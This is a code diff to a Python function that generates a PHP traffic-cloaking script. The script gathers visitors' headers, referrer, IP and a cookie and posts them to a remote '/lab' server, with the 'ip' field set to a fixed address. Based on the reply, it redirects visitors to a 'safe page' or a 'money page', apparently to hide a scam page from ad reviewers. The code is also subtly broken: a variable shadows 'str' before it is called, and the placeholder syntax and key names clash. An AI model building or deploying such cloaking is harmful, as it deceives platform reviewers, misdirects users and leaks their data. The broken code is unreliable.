@@ -1,3 +1,6 @@
+from flask import request
+
+
 def get_php(member_id, subscription_id):
     str = """
     <?php error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
@@ -5,7 +8,7 @@ $id = "{}";
 $uid="{}";
 $qu=$_SERVER["QUERY_STRING"];
 $ch = curl_init();
-$url = "http://127.0.0.1:5000/lab";
+$url = "http://{}:5000/lab";
 $data=array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>'209.85.238.11',"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);
 curl_setopt($ch,CURLOPT_URL, $url);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
@@ -21,6 +24,6 @@ header("location: ".$a13['user_safe_page'], TRUE, 301);
 if( !empty($a13['money_page']))
 header("location: ".$a13['user_money_page'], TRUE, 301);
 ?>
-    """ % (subscription_id, member_id)
+    """ % (str(subscription_id), str(member_id), str(request.host))
     return bytes(str, 'utf-8')
 
